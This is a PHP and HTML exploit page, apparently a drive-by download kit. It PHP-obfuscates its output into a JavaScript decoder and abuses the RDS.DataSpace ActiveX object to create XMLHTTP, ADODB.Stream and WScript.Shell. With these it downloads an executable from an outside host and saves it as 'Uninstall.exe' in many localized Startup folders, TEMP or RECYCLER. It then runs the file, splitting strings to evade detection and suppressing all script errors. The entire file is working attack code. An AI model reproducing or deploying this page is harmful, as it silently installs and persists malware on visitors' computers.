<?
$url="http://1.ru/1.exe";

$array = array();
$ray = array();
function encrypt($content) { $table = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_@"; 
  $xor = 165;   $table = array_keys(count_chars($table, 1)); 
  $i_min = min($table); 
  $i_max = max($table); 
  for ($c = count($table); $c > 0; $r = mt_rand(0, $c--)) 
  array_splice($table, $r, $c - $r, array_reverse(array_slice($table, $r, $c - $r)));   $len = strlen($content); 
  $word = $shift = 0; 
  for ($i = 0; $i < $len; $i++) 
  {$ch = $xor ^ ord($content[$i]);    $word |= ($ch << $shift);    $shift = ($shift + 2) % 6;    $enc .= chr($table[$word & 0x3F]);    $word >>= 6;    if (!$shift) { $enc .= chr($table[$word]); $word >>= 6; }}    if ($shift)    $enc .= chr($table[$word]); 
  $tbl = array_fill($i_min, $i_max - $i_min + 1, 0); 
  while (list($k,$v) = each($table)) 
  $tbl[$v] = $k; 
  $tbl = implode(",", $tbl); 
  $fi = ",p=0,s=0,w=0,t=Array({$tbl})"; 
  $f  = "w|=(t[x.charCodeAt(p++)-{$i_min}])<<s;"; 
  $f .= "if(s){r+=String.fromCharCode({$xor}^w&255);w>>=8;s-=2}else{s=6}"; 
  $r = "<script language=JavaScript>"; 
  $r.= "function dc(x){";
  $r.= "var l=x.length,b=1024,i,j,r{$fi};"; 
  $r.= "for(j=Math.ceil(l/b);j>0;j--){r='';for(i=Math.min(l,b);i>0;i--,l--){{$f}}document.write(r)}"; 
  $r.= "}dc(\"{$enc}\")"; 
  $r.= "</script>"; 
  return $r;} 
ob_start("encrypt"); 
?>

<html>
<body>
<div id=rep></div><br>
<div id=myobj></div>
<script>

function stpError() { return true; }; 
window.onerror = stpError;

var obj_RDS = document.createElement('object');
obj_RDS.setAttribute('id','obj_RDS');
obj_RDS.setAttribute('classid','clsid:BD96C556-65A3-11D0-983A-00C04FC29E36');

var obj_msxml2 = obj_RDS.CreateObject("msxml2.XMLHTTP","");
obj_msxml2.open("GET","<?=$url?>",false);
obj_msxml2.send();

var obj_adodb =obj_RDS.CreateObject("adodb.stream","");
obj_adodb.type = 1;
obj_adodb.open();
var kaka='';
eval('obj_ad'+kaka+'odb.Wr'+kaka+'ite(o'+kaka+'bj_ms'+kaka+'xml2.re'+kaka+'spons'+kaka+'eBody);');

var hdrive="";
var dtemp="";
try {
 var obj_WScript = obj_RDS.CreateObject("WScript.Shell","");
} catch(e){};
try {
 var wshProcEnv = obj_WScript.Environment("PROCESS");
 hdrive=wshProcEnv("HOMEDRIVE");
 dtemp=wshProcEnv("TEMP");
} catch(e){};
if (hdrive == "") { hdrive="C:"; };
try {
 dstart=obj_WScript.SpecialFolders("Startup");
 daustart=obj_WScript.SpecialFolders("AllUsersStartup");
} catch(e){};
var fnex = "";
var fn = "";
try {
 if (dstart == "") {} else {
  var fn = daustart+"\\Uninstall.exe";
  obj_adodb.SaveToFile(fn,2);
  fnex=fn;
 };
} catch(e){};
if (fnex=="") {
 try {
  if (dstart == "") {} else {
   var fn = dstart+"\\Uninstall0.exe";
   obj_adodb.SaveToFile(fn,2);
   fnex=fn;
  };
 } catch(e){};
};
r1og1ra1m = 'rogram';
if (fnex=="") {
 try {
  if (dstart == "") {} else {
   var fn = "C:\\Documents and Settings\\All Users\\Menu Inicio\\P"+r1og1ra1m+"as\\Inicio\\Uninstall.exe";
   obj_adodb.SaveToFile(fn,2);
   fnex=fn;
  };
 } catch(e){};
};
if (fnex=="") {
 try {
  if (dstart == "") {} else {
   var fn = "C:\\Documents and Settings\\All Users\\Menuen Start\\P"+r1og1ra1m+"mer\\Start\\Uninstall.exe";
   obj_adodb.SaveToFile(fn,2);
   fnex=fn;
  };
 } catch(e){};
};
if (fnex=="") {
 try {
  if (dstart == "") {} else {
   var fn = "C:\\Documents and Settings\\All Users\\Menu Start\\P"+r1og1ra1m+"ma\\'s\\Opstarten\\Uninstall.exe";
   obj_adodb.SaveToFile(fn,2);
   fnex=fn;
  };
 } catch(e){};
};
if (fnex=="") {
 try {
  if (dstart == "") {} else {
   var fn = "C:\\Documents and Settings\\All Users\\Menu Start\\P"+r1og1ra1m+"y\\Autostart\\Uninstall.exe";
   obj_adodb.SaveToFile(fn,2);
   fnex=fn;
  };
 } catch(e){};
};
if (fnex=="") {
 try {
  if (dstart == "") {} else {
   var fn = "C:\\Documents and Settings\\All Users\\Menu Avvio\\P"+r1og1ra1m+"mi\\Esecuzione automatica\\Uninstall.exe";
   obj_adodb.SaveToFile(fn,2);
   fnex=fn;
  };
 } catch(e){};
};
if (fnex=="") {
 try {
  if (dstart == "") {} else {
   var fn = "C:\\Documents and Settings\\All Users\\Kaynnista-valikko\\Ohjelmat\\Kaynnistys\\Uninstall.exe";
   obj_adodb.SaveToFile(fn,2);
   fnex=fn;
  };
 } catch(e){};
};
if (fnex=="") {
 try {
  if (dstart == "") {} else {
   var fn = "C:\\Documents and Settings\\All Users\\Start Menu\\P"+r1og1ra1m+"lar\\BASLANGIC\\Uninstall.exe";
   obj_adodb.SaveToFile(fn,2);
   fnex=fn;
  };
 } catch(e){};
};
if (fnex=="") {
 try {
  if (dstart == "") {} else {
   var fn = "C:\\Documents and Settings\\All Users\\Start-meny\\P"+r1og1ra1m+"mer\\Oppstart\\Uninstall.exe";
   obj_adodb.SaveToFile(fn,2);
   fnex=fn;
  };
 } catch(e){};
};
if (fnex=="") {
 try {
  if (dstart == "") {} else {
   var fn = "C:\\Documents and Settings\\All Users\\Start-menyn\\P"+r1og1ra1m+"\\Autostart\\Uninstall.exe";
   obj_adodb.SaveToFile(fn,2);
   fnex=fn;
  };
 } catch(e){};
};
if (fnex=="") {
 try {
  if (dstart == "") {} else {
   var fn = "C:\\Documents and Settings\\All Users\\Menu Iniciar\\P"+r1og1ra1m+"as\\Iniciar\\Uninstall.exe";
   obj_adodb.SaveToFile(fn,2);
   fnex=fn;
  };
 } catch(e){};
};
if (fnex=="") {
 try {
  if (dstart == "") {} else {
   var fn = "C:\\Dokumente und Einstellungen\\All Users\\Startmenu\\P"+r1og1ra1m+"me\\Autostart\\Uninstall.exe";
   obj_adodb.SaveToFile(fn,2);
   fnex=fn;
  };
 } catch(e){};
};
//if (fnex=="") {
 try {
  if (dtemp == "") {} else {
   fn = dtemp+"\\"+Math.round(Math.random()*(1000000-1)+10000)+".exe";
   obj_adodb.SaveToFile(fn,2);
   fnex=fn;
  };
 } catch(e){};
//};
if (fnex=="") {
 try {
  var fn = hdrive+"\\Documents and Settings\\All Users\\Start Menu\\P"+r1og1ra1m+"s\\Startup\\Uninstall.exe";
  obj_adodb.SaveToFile(fn,2);
  fnex=fn;
 } catch(e){};
};
if (fnex=="") {
 try {
  fn = "C:\\RECYCLER\\"+Math.round(Math.random()*(1000000-1)+10000)+".exe";
  obj_adodb.SaveToFile(fn,2);
  fnex=fn;
 } catch(e){};
};
if (fnex=="") {
 try {
  fn = "\\sys"+Math.round(Math.random()*(1000000-1)+10000)+".exe";
  obj_adodb.SaveToFile(fn,2);
  fnex=fn;
 } catch(e){};
};

var runok=0;

if (fnex=="") {} else { 
 try {
  obj_WScript.Exec(fnex); 
  runok=1;
 } catch(e){};
 if (runok==0) {
  myobj.innerHTML="<object id='run2' classid='clsid:527196a4-b1a3-4647-931d-37ba5af23037' codebase='"+fnex+"'></object>";
 };
};

</script>
</body>
</html>